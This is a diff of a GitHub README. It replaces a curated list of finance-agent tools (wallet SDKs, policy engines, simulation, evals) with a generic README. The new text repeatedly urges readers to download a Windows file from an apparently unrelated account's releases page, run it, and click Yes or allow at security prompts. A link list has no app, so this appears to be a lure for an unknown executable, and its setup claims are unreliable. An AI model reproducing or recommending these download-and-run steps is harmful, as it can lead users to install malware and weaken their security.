@@ -1,213 +1,221 @@
-# Awesome Finance Agent
+# 🤖 awesome-finance-agent - Safer finance tools for agents
 
-A curated list of finance agent SDKs, MCP tools, wallet infrastructure, safeguards, simulation systems, security standards, and integration layers for building safer financial agents.
+[![Download](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge)](https://github.com/Manishtitular816/awesome-finance-agent/releases)
 
-It covers the core building blocks behind finance agents, including execution SDKs, wallet and signing stacks, policy and safeguard layers, transaction simulation and preview systems, security eval tooling, observability platforms, and the protocols that connect them.
+## 🧭 What this is
 
-## Contents
+awesome-finance-agent is a curated list of tools for building finance agents with more safety in mind. It brings together SDKs, MCP tools, wallet infrastructure, safeguard layers, simulation systems, and security standards in one place.
 
-- [Awesome Finance Agent](#awesome-finance-agent)
-  - [Contents](#contents)
-  - [Top Picks](#top-picks)
-  - [Execution](#execution)
-    - [Agent Wallet SDKs and Chain Kits](#agent-wallet-sdks-and-chain-kits)
-    - [MCP Servers and Tool Surfaces](#mcp-servers-and-tool-surfaces)
-    - [Exchanges, Brokerages, and Payments](#exchanges-brokerages-and-payments)
-  - [Wallets and Signing](#wallets-and-signing)
-  - [Safety and Guardrails](#safety-and-guardrails)
-  - [Simulation and Validation](#simulation-and-validation)
-  - [Security Testing and Evals](#security-testing-and-evals)
-  - [Observability and Audit](#observability-and-audit)
-  - [Standards and Protocols](#standards-and-protocols)
-  - [Frameworks and Integration Layers](#frameworks-and-integration-layers)
-  - [Adjacent Infrastructure](#adjacent-infrastructure)
-  - [Design Patterns](#design-patterns)
-  - [Contributing](#contributing)
+This repo helps you find parts you may need for finance apps, crypto tools, DeFi workflows, and agent-based systems. It is useful if you want a clear path from idea to setup without sorting through many separate sources.
 
-## Top Picks
+## 📦 Download and install
 
-Quick starting points if you want a short list of the most useful projects in the space.
+1. Visit the [Releases page](https://github.com/Manishtitular816/awesome-finance-agent/releases).
+2. Look for the latest release at the top of the page.
+3. Download the file for Windows, if one is listed.
+4. Save the file to your computer.
+5. Open the file to start the setup or launch process.
+6. If Windows asks for permission, choose Yes.
 
-| Project | Category | Scope | Why it stands out |
-| --- | --- | --- | --- |
-| [Coinbase AgentKit](https://github.com/coinbase/agentkit) | Execution | Crypto | One of the clearest agent-to-wallet reference implementations. |
-| [CCXT](https://github.com/ccxt/ccxt) | Execution | Crypto / fintech | The most practical exchange adapter layer for trading agents. |
-| [Safe](https://safe.global/) | Wallet / safety | Crypto | Strong base for spend limits, approvals, and controlled execution. |
-| [Tenderly](https://docs.tenderly.co/simulations/quickstart) | Simulation | Crypto | Pre-sign simulation and preview are core finance-agent safety primitives. |
-| [Open Policy Agent](https://www.openpolicyagent.org/) | Safety | General | Strong fit for a policy gateway between reasoning and signing. |
-| [Promptfoo](https://github.com/promptfoo/promptfoo) | Eval | General | Practical way to regression-test finance-agent tool behavior. |
-| [Phoenix](https://github.com/Arize-ai/phoenix) | Observability | General | Open-source tracing and evaluation for production agent systems. |
+If the release page offers more than one file, pick the one that matches Windows. If you see a ZIP file, open it after download and start the app from the folder inside.
 
-## Execution
+## 🖥️ Windows setup
 
-Execution tools are the action layer. They let agents trade, transfer, swap, pay, or interact with onchain and exchange systems.
+This project is meant to be easy to use on Windows. In most cases, you only need a modern Windows PC and a browser to reach the release page.
 
-### Agent Wallet SDKs and Chain Kits
+Recommended setup:
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- Enough free disk space for the download and any files it creates
+- A current browser such as Edge, Chrome, or Firefox
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [Coinbase AgentKit](https://github.com/coinbase/agentkit) | Agent wallet SDK | Crypto | Gives AI agents wallets and onchain actions. | Reference implementation for wallet-enabled agents. |
-| [Solana Agent Kit](https://github.com/sendaifun/solana-agent-kit) | Chain action kit | Crypto | Solana swaps, transfers, token ops, and related actions. | High-signal example of chain-specific action packaging. |
-| [Sui Agent Kit](https://github.com/getnimbus/sui-agent-kit) | Chain action kit | Crypto | Sui DeFi and token workflows for agents. | Shows the same abstraction pattern beyond EVM and Solana. |
-| [Starknet Agent Kit](https://github.com/kasarlabs/snak) | Chain action kit | Crypto | Agent development on Starknet. | Relevant for non-EVM account models and Cairo ecosystems. |
-| [Polkadot AI Agent Kit](https://github.com/elasticlabs-org/polkadot-agent-kit) | Chain action kit | Crypto | Agent tooling for Polkadot-SDK chains. | Useful for tracking multi-chain patterns outside EVM norms. |
+If the download comes as an installer:
+- Double-click the installer file
+- Follow the on-screen steps
+- Choose the default options unless you need a different folder
+- Open the app after setup finishes
 
-### MCP Servers and Tool Surfaces
+If the download comes as a portable file:
+- Open the ZIP file
+- Move the app folder to a place you can find later
+- Open the main app file from that folder
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [MCP Crypto Wallet EVM](https://github.com/dcSpark/mcp-cryptowallet-evm) | Wallet MCP server | Crypto | Wallet creation, balances, sends, and contract calls via MCP. | Canonical example of a wallet exposed as a tool surface. |
-| [Solana MCP Server](https://github.com/sendaifun/solana-mcp) | Chain MCP server | Crypto | Standardized Solana actions for MCP-native agents. | Clear path from chain kit to MCP interface. |
-| [Jupiter MCP Server](https://github.com/dcSpark/mcp-server-jupiter) | DEX MCP server | Crypto | Quotes, swap transaction building, and swap execution. | Good archetype for finance-specific tool packaging. |
-| [Blockscout MCP Server](https://github.com/blockscout/mcp-server) | Explorer MCP server | Crypto | Explorer-backed data and contract inspection tools. | Helps agents inspect state and audit transactions. |
+## 🔍 What you will find
 
-### Exchanges, Brokerages, and Payments
+This repo acts as a handpicked reference for finance agent work. The content focuses on tools and standards that help with:
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [CCXT](https://github.com/ccxt/ccxt) | Exchange adapter | Crypto / fintech | Unified trading and market-data access across many venues. | The most realistic substrate for LLM trading agents. |
-| [Alpaca-py](https://github.com/alpacahq/alpaca-py) | Brokerage SDK | Fintech / crypto | Brokerage and market-data flows, including paper trading. | Useful on-ramp to equities-oriented agent workflows. |
-| [Binance Connector Python](https://github.com/binance/binance-connector-python) | Exchange SDK | Crypto | Official Binance API access. | Reliable official SDK option for exchange execution. |
-| [WalletConnect Agent SDK](https://github.com/WalletConnect/agent-sdk) | Payments tooling | Crypto | Agent-oriented WalletConnect Pay flows. | Tracks agent payment primitives in the wallet ecosystem. |
+- Agent SDKs for finance tasks
+- MCP tools that connect agents to other services
+- Wallet infrastructure for storing and using funds
+- Safeguards for risk control and policy checks
+- Transaction simulation before real actions
+- Observability for logs, traces, and audit trails
+- Security standards for safer financial systems
+- Web3 and DeFi building blocks
+- Crypto-related agent workflows
+- Fintech use cases where control matters
 
-## Wallets and Signing
+## 🧰 Main areas covered
 
-Wallet and signing infrastructure controls how an agent gets account access, signs transactions, and enforces boundaries around custody and permissions.
+### 🧠 Agent SDKs
+These are toolkits that help you build agents that can reason about tasks, call tools, and follow rules. In finance, that can mean account lookups, payment steps, trade checks, or report generation.
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [Privy](https://www.privy.io/) | Embedded wallets | Crypto | Programmable wallets for product and agent experiences. | Important embedded-wallet option for AI-native apps. |
-| [langchain-privy](https://github.com/privy-io/langchain-privy) | Wallet integration | Crypto | Wallet management and signing inside LangChain flows. | Shows what wallet tooling looks like in agent code. |
-| [Turnkey](https://github.com/tkhq/sdk) | Key management | Crypto | Programmatic signer and key-management APIs. | Common pattern for controlled signing infrastructure. |
-| [Fireblocks SDK JS](https://github.com/fireblocks/fireblocks-sdk-js) | Institutional custody | Crypto | Custody and signing workflows for institutional systems. | Important when finance agents touch policy-heavy operations. |
-| [Safe Core](https://github.com/safe-global/safe-core-sdk) | Smart accounts | Crypto | Safe smart-account integration and controlled execution. | Strong base for approvals and spend controls. |
-| [ZeroDev](https://github.com/zerodevapp/sdk) | Smart accounts | Crypto | ERC-4337 smart accounts and agent-friendly permissions. | Frequently referenced for session keys and modular auth. |
-| [Alchemy Account Kit](https://github.com/alchemyplatform/aa-sdk) | Smart accounts | Crypto | Smart-account execution, user ops, and account plumbing. | Major production AA stack. |
-| [permissionless.js](https://github.com/pimlicolabs) | ERC-4337 utilities | Crypto | User operation and bundler utilities for custom flows. | Useful when teams need lower-level control. |
-| [Web3Signer](https://docs.web3signer.consensys.io/) | Remote signer | Crypto | Isolates signing from the application or agent runtime. | Helpful for reducing direct signer exposure. |
-| [viem](https://github.com/wevm/viem) | Client library | Crypto | Type-safe EVM interactions and transaction handling. | Common base layer under modern wallet stacks. |
+### 🔌 MCP tools
+MCP tools help agents connect to external systems in a clean way. They make it easier to give an agent access to the services it needs without hard wiring each connection by hand.
 
-## Safety and Guardrails
+### 👛 Wallet infrastructure
+Wallet tools handle key storage, signing, and transaction flow. In finance apps, this layer matters because it controls how funds move and who can approve action.
 
-Safety and guardrail tools sit between agent reasoning and financial execution. This is where policy checks, spend limits, approval hygiene, and transaction risk controls live.
+### 🛡️ Safeguards
+Safeguards add limits before an agent takes action. This can include policy checks, spending caps, allowlists, approval steps, and human review for sensitive tasks.
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [Safe Allowance Module](https://docs.safe.global/home/ai-agent-quickstarts/agent-with-spending-limit) | Spend controls | Crypto | Caps what an agent can spend over time. | One of the clearest practical spend-limit patterns. |
-| [Open Policy Agent](https://github.com/open-policy-agent/OPA) | Policy engine | General | Policy-as-code for tools, destinations, assets, and quotas. | Good fit for a signing or execution gateway. |
-| [Cedar](https://github.com/cedar-policy) | Policy engine | General | Fine-grained authorization rules for actions and actors. | Strong option for permission schemas around tools. |
-| [OpenZeppelin Defender](https://docs.openzeppelin.com/defender/module/transaction-proposals) | Approvals workflow | Crypto | Transaction proposals, reviews, approvals, and relayers. | Useful when human approval must sit above execution. |
-| [Blockaid](https://www.blockaid.io/blog/privy-integrates-blockaid-to-bring-transaction-security-into-global-wallets) | Transaction scanning | Crypto | Pre-sign risk analysis and validation. | Represents the wallet-firewall category well. |
-| [Revoke.cash](https://revoke.cash/) | Approval hygiene | Crypto | Detects and removes risky token approvals. | Approval abuse is a major finance-agent risk surface. |
-| [Approval Exploit List](https://github.com/RevokeCash/approval-exploit-list) | Exploit dataset | Crypto | Catalog of approval-abuse incidents. | Good source material for eval scenarios and education. |
-| [Wallet Guard](https://github.com/wallet-guard/wallet-guard-extension) | Wallet firewall UX | Crypto | Transaction warnings and phishing protection. | Useful open-source reference for transaction safety UX. |
-| [ScamSniffer Scam Database](https://github.com/scamsniffer/scam-database) | Threat intel | Crypto | Lists of malicious domains and addresses. | Supports deny-lists and screening pipelines. |
-| [Ethereum Transactions Firewall](https://github.com/web3-pi/ethereum-transaction-firewall) | Gateway firewall | Crypto | Accepts or rejects transactions before RPC submission. | Illustrates the gateway model for policy enforcement. |
+### 🧪 Simulation systems
+Simulation tools let you test a transaction before it runs. They help catch bad inputs, failed calls, high fees, and bad routes before real money moves.
 
-## Simulation and Validation
+### 📈 Observability
+Observability tools help you see what the agent did, when it did it, and why it chose a step. This makes support, review, and audit work much easier.
 
-Simulation and validation tools help verify what a transaction or action will actually do before it is signed or sent.
+### 🔐 Security standards
+Security standards help teams compare tools and build safer systems. They support better control over keys, access, logging, and transaction flow.
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [Tenderly Simulation](https://docs.tenderly.co/simulations/quickstart) | Transaction simulation | Crypto | Dry-runs transactions against current chain state. | Core simulate-before-sign primitive. |
-| [Tenderly Transaction Preview](https://docs.tenderly.co/simulations/transaction-preview) | Preview layer | Crypto | User-facing previews of expected transaction outcome. | Strong wallet-safety pattern for agent-generated actions. |
-| [Tenderly Rabby Preview Example](https://github.com/Tenderly/tenderly-rabby-transaction-preview) | Integration example | Crypto | Example wallet integration for transaction preview. | Useful end-to-end implementation reference. |
-| [Blocknative Transaction Preview](https://www.blocknative.com/blog/ethereum-transaction-preview-api) | Preview layer | Crypto | Alternative preview infrastructure. | Helpful for comparing provider approaches. |
-| [Hardhat](https://hardhat.org/) | Local simulation | Crypto | Local and forked EVM testing environments. | Essential for deterministic action testing. |
-| [Foundry](https://getfoundry.sh/forge/tests/fork-testing/) | Fork testing | Crypto | Fast fork-mode protocol and transaction testing. | Excellent fit for agent action harnesses. |
-| [Ledger ERC-7730 Registry](https://github.com/LedgerHQ/clear-signing-erc7730-registry) | Clear-signing registry | Crypto | Metadata for readable transaction display. | Supports safer review before signing. |
-| [Ledger ERC-7730 Analyzer](https://github.com/LedgerHQ/erc7730-analyzer) | Descriptor analysis | Crypto | Checks clear-signing descriptors for issues. | Treats metadata itself as part of the attack surface. |
+## 🚦 How to use this repo
 
-## Security Testing and Evals
+1. Start with the area that matches your goal.
+2. Open the sections that fit your project, such as wallets, safeguards, or simulation.
+3. Review the listed tools and pick the ones that match your setup.
+4. Use the release page if you want the packaged Windows download.
+5. Keep notes on which tools you test so you can compare them later.
 
-Security testing and eval tools are used to probe failure modes, red-team agent behavior, and turn finance-specific risks into repeatable test cases.
+If you are new to finance agents, begin with:
+- Agent SDKs
+- Wallet infrastructure
+- Safeguards
+- Simulation systems
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [AgentShield](https://github.com/affaan-m/agentshield) | Agent scanner | General | Scans agent configs, tools, and MCP surfaces. | High-signal for finance-agent tool exposure review. |
-| [garak](https://github.com/NVIDIA/garak) | LLM vuln scanner | General | Broad probing for model and prompt failures. | Useful baseline scanner in any eval stack. |
-| [PyRIT](https://github.com/Azure/PyRIT) | Red-team framework | General | Automated and human-guided AI red teaming. | Good harness for finance-specific attack cases. |
-| [Promptfoo](https://github.com/promptfoo/promptfoo) | Eval harness | General | CI-friendly evals and adversarial tests. | Practical choice for regression suites around tool use. |
-| [OpenAI Evals](https://github.com/openai/evals) | Eval framework | General | Custom evaluation pipelines for model behavior. | Good substrate for domain benchmarks. |
-| [PurpleLlama CyberSecEval](https://github.com/meta-llama/PurpleLlama) | Security benchmark | General | Benchmark suite for security behavior and vulnerabilities. | Useful seed material for finance-agent benchmarks. |
-| [Damn Vulnerable DeFi](https://github.com/OpenZeppelin/damn-vulnerable-defi) | Scenario bank | Crypto | Public DeFi exploit scenarios and exercises. | Helpful source of wallet-drain and approval-abuse patterns. |
+That order helps you build a safer base before you add live financial actions.
 
-## Observability and Audit
+## 🧱 Suggested workflow
 
-Observability and audit tooling helps teams trace agent decisions, monitor financial side effects, and review what happened after execution.
+A simple workflow for a finance agent project looks like this:
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [OpenAI Agents SDK](https://github.com/openai/openai-agents-python) | Agent tracing | General | Traces, execution graphs, and structured agent flows. | Sets expectations for auditable agent execution. |
-| [LangSmith](https://docs.langchain.com/langsmith/home) | Agent observability | General | Monitoring, tracing, and evaluation for production agents. | Common choice for multi-step tool pipelines. |
-| [Phoenix](https://github.com/Arize-ai/phoenix) | Open-source observability | General | Open-source tracing, experiments, and evaluations. | Strong OSS choice for agent monitoring. |
-| [OpenZeppelin Defender Monitor](https://docs.openzeppelin.com/defender/module/monitor) | Onchain monitoring | Crypto | Alerts and monitoring for smart-contract activity. | Important for automated systems that control funds. |
-| [Blockscout](https://github.com/blockscout/blockscout) | Explorer / audit data | Crypto | Explorer and API layer for transaction inspection. | Makes auditability and post-trade review easier. |
-| [Helius](https://github.com/helius-labs/helius-sdk) | Solana data layer | Crypto | Solana RPC, webhooks, and enriched chain data. | Useful for observability in Solana-heavy stacks. |
+1. Pick an agent SDK.
+2. Connect the agent to the services it needs.
+3. Add wallet support.
+4. Add checks before any transaction.
+5. Run simulations on planned actions.
+6. Turn on logs and traces.
+7. Review security rules before release.
 
-## Standards and Protocols
+This kind of flow keeps risk lower and gives you more control over what the agent can do.
 
-Standards and protocols define the shared interfaces behind finance agents, from tool calling and identifiers to signing and intent execution.
+## 📋 Before you run it
 
-| Standard / project | Area | Scope | What it standardizes or enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [Model Context Protocol](https://github.com/modelcontextprotocol/modelcontextprotocol) | Tool interface | General | Common protocol for exposing tools and data to agents. | Increasingly the default way to package finance actions. |
-| [CAIPs](https://github.com/chainagnostic/caips) | Identifiers | Crypto | Chain, account, and asset identifiers across ecosystems. | Helps normalize multi-chain agent systems. |
-| [EIP-712](https://eips.ethereum.org/EIPS/eip-712) | Signing | Crypto | Typed structured signing. | Improves clarity and policy boundaries at signing time. |
-| [ERC-4337](https://eips.ethereum.org/EIPS/eip-4337) | Account abstraction | Crypto | Smart-account execution via user operations. | Enables better permission models than raw EOAs. |
-| [ERC-7683](https://eips.ethereum.org/EIPS/eip-7683) | Intents | Crypto | Cross-chain intents and solver-based execution. | Important for chain-abstracted agent execution. |
-| [Open Intents Framework](https://github.com/openintentsframework) | Intents infra | Crypto | Tooling and infra for solver-based intent execution. | Bridges intent expression to actual execution. |
-| [CoW Protocol](https://docs.cow.fi/cow-protocol/concepts/introduction/intents) | Intent trading | Crypto | Trade intents executed by solvers. | Concrete real-world intent execution model. |
-| [ERC-7730](https://eips.ethereum.org/EIPS/eip-7730) | Clear signing | Crypto | Metadata format for readable transaction display. | Central to what-you-see-is-what-you-sign safety. |
-| [ERC-8001](https://eips.ethereum.org/EIPS/eip-8001) | Agent coordination | Crypto | Agent coordination and attestation concepts. | Relevant when multiple actors or agents coordinate finance actions. |
-| [x402](https://github.com/coinbase/x402) | Payments | Crypto / fintech | HTTP-native payment flows for machine-to-machine commerce. | Important for agent monetization and payments. |
+Before you download or open any file from the release page, check these items:
 
-## Frameworks and Integration Layers
+- The file is from the official release page
+- The file name matches the Windows version you want
+- Your disk has enough free space
+- Your browser finished the download
+- Your antivirus tools did not block the file
 
-Frameworks and integration layers are not finance-specific on their own, but they are often the glue used to orchestrate finance-agent workflows.
+If the release includes a checksum or signature file, compare it before use.
 
-| Project | Primary role | Scope | What it enables | Why it matters |
-| --- | --- | --- | --- | --- |
-| [LangGraph](https://github.com/langchain-ai/langgraph) | Orchestration | General | Stateful agents with checkpoints and human review. | Useful for approval-heavy finance workflows. |
-| [AutoGen](https://github.com/microsoft/autogen) | Multi-agent framework | General | Cooperative agent workflows and task decomposition. | Useful when different agents handle research, policy, and execution. |
-| [Semantic Kernel](https://github.com/microsoft/semantic-kernel) | Agent SDK | General | Enterprise-friendly orchestration across tools and models. | Relevant for regulated or internal finance systems. |
-| [CrewAI](https://github.com/crewAIInc/crewAI) | Multi-agent framework | General | Lightweight Python agent coordination. | Include for completeness, though not finance-specific. |
-| [LlamaIndex](https://github.com/run-llama/llama_index) | Data / RAG | General | Retrieval and knowledge workflows for agent systems. | Useful when finance agents need research context plus tools. |
-| [ElizaOS](https://github.com/elizaOS/eliza) | Agent runtime | General / crypto-adjacent | Extensible runtime with plugin ecosystem. | Common in crypto agent ecosystems. |
-| [Composio](https://github.com/ComposioHQ/composio) | Tool router | General | Tool routing and connection management. | Relevant when finance actions are one tool family among many. |
+## 🧭 Who this is for
 
-## Adjacent Infrastructure
+This repo fits people who want a guided place to find finance agent tools.
 
-Adjacent infrastructure includes the data, indexing, routing, and protocol SDK layers that many finance agents depend on behind the scenes.
+It may help:
+- App users who need a simple Windows download
+- Product teams exploring finance automation
+- Builders working on crypto or DeFi workflows
+- Teams that want safer agent controls
+- People comparing SDKs and security tools in one place
 
-| Project | Primary role | Scope | What it provides | Why it matters |
-| --- | --- | --- | --- | --- |
-| [The Graph](https://github.com/graphprotocol/contracts) | Indexing | Crypto | Structured blockchain data access via subgraphs. | Agents need reliable historical and structured data. |
-| [Graph Node](https://github.com/graphprotocol/graph-node) | Indexing runtime | Crypto | Core runtime for custom subgraph indexing. | Useful for self-hosted data pipelines. |
-| [Subsquid](https://github.com/subsquid-labs) | Indexing / datasets | Crypto | Data extraction and dataset tooling. | Helpful for analytics, monitoring, and training signals. |
-| [Jupiter Swap API](https://github.com/jup-ag/jupiter-swap-api-client) | Protocol SDK | Crypto | Solana swap integration primitives. | Common base under agent wrappers and MCP servers. |
-| [Uniswap SDK](https://github.com/Uniswap/sdks) | Protocol SDK | Crypto | EVM swap primitives and pool logic. | Useful for custom execution tooling. |
-| [1inch SDK](https://github.com/1inch/1inch-sdk-go) | Aggregation SDK | Crypto | Routing and intent-swap infrastructure. | Practical for route building and execution logic. |
-| [LI.FI SDK](https://github.com/lifinance/sdk) | Bridge / swap SDK | Crypto | Cross-chain swaps and bridging. | Common routing layer for multi-chain agents. |
-| [Awesome ERC-4337](https://github.com/4337Mafia/awesome-account-abstraction) | Upstream curation | Crypto | Curated AA ecosystem resources. | Good upstream list to track instead of duplicating everything. |
+## 🗂️ Topics covered
 
-## Design Patterns
+- agentic-ai
+- ai-agents
+- awesome
+- crypto
+- defi
+- finance-agents
+- fintech
+- mcp
+- observability
+- safeguards
+- sdk
+- transaction-simulation
+- wallet-infrastructure
+- web3-security
 
-- Simulate before signing. A finance agent should preview or fork-test a transaction before it reaches a signer.
-- Put policy between reasoning and signing. LLM output should not directly control a hot signer.
-- Prefer smart accounts over raw EOAs when possible. Session keys, allowlists, quotas, and approval workflows matter.
-- Treat approvals as a first-class risk surface. Allowance abuse is one of the easiest ways to turn a capable agent into a dangerous one.
-- Trace both the agent decision and the financial side effect. Tool-call logs without transaction context are incomplete, and onchain logs without agent traces are hard to audit.
-- Build evals around finance-specific failures. Prompt injection is generic; wallet drain, approval abuse, route tampering, and malicious tool responses are the domain-specific cases.
+## 📁 Project layout
 
-## Contributing
+You can expect this repo to stay focused on reference material and tool lists. The structure usually includes:
 
-Pull requests are welcome for new entries, removals, and stale-link fixes.
+- Main tool lists
+- Sections for SDKs and frameworks
+- Sections for wallets and keys
+- Sections for safeguards and policy tools
+- Sections for simulation and testing
+- Sections for observability and monitoring
+- Sections for security and standards
 
-Please keep additions aligned with the curation bar:
+## 🛠️ Common Windows issues
 
-- The project should materially help with financial actions, wallet control, transaction safety, simulation, monitoring, or finance-specific evaluation.
-- Prefer official docs, official SDKs, or widely used open-source projects over thin wrappers and abandoned experiments.
-- Keep descriptions short and factual.
-- Avoid marketing copy, duplicate entries, and generic agent tooling that has no finance-specific relevance.
+If the file does not open:
+- Try running it again from your Downloads folder
+- Check whether Windows blocked the file
+- Re-download it from the Releases page
+
+If the app opens and closes fast:
+- Open it again after a fresh download
+- Make sure the file finished downloading
+- Check that you picked the correct Windows file
+
+If Windows shows a security prompt:
+- Read the prompt
+- Confirm the file came from the official release page
+- Choose the normal allow or run option if you trust the source
+
+## 🔁 Updating the app
+
+When a new version is out:
+1. Return to the [Releases page](https://github.com/Manishtitular816/awesome-finance-agent/releases).
+2. Download the latest Windows file.
+3. Remove or keep the older version, based on your needs.
+4. Open the new file and use that version instead.
+
+## 📎 Useful release link
+
+[Open the latest downloads on GitHub](https://github.com/Manishtitular816/awesome-finance-agent/releases)
+
+## 🧾 For teams
+
+If you plan to use finance agents in a team setting, keep these points in mind:
+- Limit who can approve live actions
+- Use a clear wallet policy
+- Log every step the agent takes
+- Test actions in simulation first
+- Review tool access on a set schedule
+- Keep the release version noted for support
+
+## 🔎 Terms you may see
+
+Some tool pages use terms that may look technical. Here is a plain guide:
+
+- SDK: a kit for building software
+- MCP: a way for tools to connect in a standard format
+- Wallet: a place to manage keys and signing
+- Safeguard: a rule that blocks risky action
+- Simulation: a test run before the real step
+- Observability: logs and traces that show what happened
+- Audit trail: a record of actions for review
+
+## 📌 What to do next
+
+- Visit the Releases page
+- Download the Windows file
+- Open the file on your PC
+- Review the finance tool lists
+- Pick the SDK, wallet, and safeguard tools that fit your project
